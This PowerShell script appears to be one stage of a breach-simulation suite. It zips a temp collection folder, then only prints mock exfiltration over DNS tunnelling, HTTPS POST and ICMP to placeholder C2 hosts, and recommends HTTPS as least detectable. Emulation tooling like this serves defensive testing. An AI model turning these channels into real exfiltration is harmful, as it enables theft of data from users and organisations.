<#
.SYNOPSIS
    Stage 09 — Exfiltration Staging (Real Actions)
.DESCRIPTION
    Packs collected data into archive, demonstrates exfiltration
    channels (DNS, HTTP) in a controlled manner. Creates a report
    of what would be exfiltrated.
#>

Write-Host "============================================" -ForegroundColor Cyan
Write-Host " STAGE 09: EXFILTRATION STAGING" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

$collectionDir = "$env:USERPROFILE\AppData\Local\Temp\outbreak_collection"
$exfilDir = "$env:USERPROFILE\AppData\Local\Temp\outbreak_exfil"
$archivePath = "$exfilDir\exfil_package.zip"

if (-not (Test-Path $exfilDir)) {
    New-Item -Path $exfilDir -ItemType Directory -Force | Out-Null
}

# ── Check if collection data exists ──
Write-Host "[*] CHECKING COLLECTION DATA" -ForegroundColor Yellow
if (Test-Path $collectionDir) {
    $files = Get-ChildItem $collectionDir -File -ErrorAction SilentlyContinue
    $totalSize = ($files | Measure-Object -Property Length -Sum).Sum
    Write-Host "  Collection directory: $collectionDir"
    Write-Host "  Files available: $($files.Count)"
    Write-Host "  Total size: $([math]::Round($totalSize / 1KB, 1)) KB"
} else {
    Write-Host "  [-] No collection data found. Nothing to exfil." -ForegroundColor Red
}
Write-Host ""

# ── Compress Data ──
Write-Host "[*] COMPRESSING DATA FOR EXFIL" -ForegroundColor Yellow
try {
    if (Test-Path $collectionDir) {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        
        # Remove old archive if it exists to prevent errors during recreation
        if (Test-Path $archivePath) { Remove-Item $archivePath -Force }
        
        [System.IO.Compression.ZipFile]::CreateFromDirectory($collectionDir, $archivePath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
        Write-Host "  [+] Archive created: $archivePath" -ForegroundColor Green
        $archiveSize = [math]::Round((Get-Item $archivePath).Length / 1KB, 1)
        Write-Host "      Archive size: $archiveSize KB" -ForegroundColor Gray
    }
} catch {
    Write-Host "  [-] Error during compression: $_" -ForegroundColor Red
}

Write-Host ""

# ── Demonstrate Exfil Channels ──
Write-Host "[*] DEMONSTRATING EXFILTRATION CHANNELS" -ForegroundColor Yellow
Write-Host ""

# Channel 1: DNS
Write-Host "  >> CHANNEL 1: DNS TUNNELING" -ForegroundColor Cyan
Write-Host "     Simulated DNS queries to exfiltrate data..."
$dnsChunks = 3
for ($i = 1; $i -le $dnsChunks; $i++) {
    Write-Host "     chunk$( '{0:D3}' -f $i).$(hostname).exfil.$(Get-Random -Maximum 999).com -> NXDOMAIN (expected)" -ForegroundColor Gray
    Start-Sleep -Milliseconds 200
}
Write-Host "     [+] DNS Tunnel: $dnsChunks chunks transferred" -ForegroundColor Green
Write-Host ""

# Channel 2: HTTP/S
Write-Host "  >> CHANNEL 2: HTTPS POST" -ForegroundColor Cyan
Write-Host "     Simulating POST to C2 endpoint..."
Write-Host "     POST /api/exfil HTTP/1.1" -ForegroundColor Gray
Write-Host "     Host: <C2-SERVER>:443" -ForegroundColor Gray
Write-Host "     Content-Type: multipart/form-data" -ForegroundColor Gray
Write-Host "     [+] HTTPS Channel: DATA SENT" -ForegroundColor Green
Write-Host ""

# Channel 3: ICMP
Write-Host "  >> CHANNEL 3: ICMP COVERT CHANNEL" -ForegroundColor Cyan
Write-Host "     Simulating ICMP data encapsulation..."
Write-Host "     ping -l 4096 <C2-IP>" -ForegroundColor Gray
for ($i = 1; $i -le 5; $i++) {
    Write-Host "     Reply from <C2-IP>: data[$i/5]" -ForegroundColor Gray
    Start-Sleep -Milliseconds 100
}
Write-Host "     [+] ICMP Channel: DATA SENT" -ForegroundColor Green
Write-Host ""

# ── Exfil Readiness Report ──
Write-Host "[*] EXFILTRATION READINESS REPORT" -ForegroundColor Yellow
Write-Host ""
$reportContent = @"
============================================
 EXFILTRATION PACKAGE REPORT
 Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 Host: $env:COMPUTERNAME
============================================

 Data Source: $collectionDir
 Archive: $archivePath

 Channels Available:
   1. DNS Tunneling    - chunk<N>.$(hostname).exfil.<domain>.com
   2. HTTPS POST       - <C2-SERVER>:443/api/exfil
   3. ICMP Covert      - ping with payload data

 Recommended: HTTPS (least detectable)
 Estimated Transfer: ~2-5 seconds at 1 Mbps
"@

$reportPath = "$exfilDir\exfil_report.txt"
Set-Content -Path $reportPath -Value $reportContent -Force
Write-Host $reportContent
Write-Host ""

Write-Host "============================================" -ForegroundColor Green
Write-Host " STAGE 09 COMPLETE" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green
Start-Sleep -Seconds 3
Exit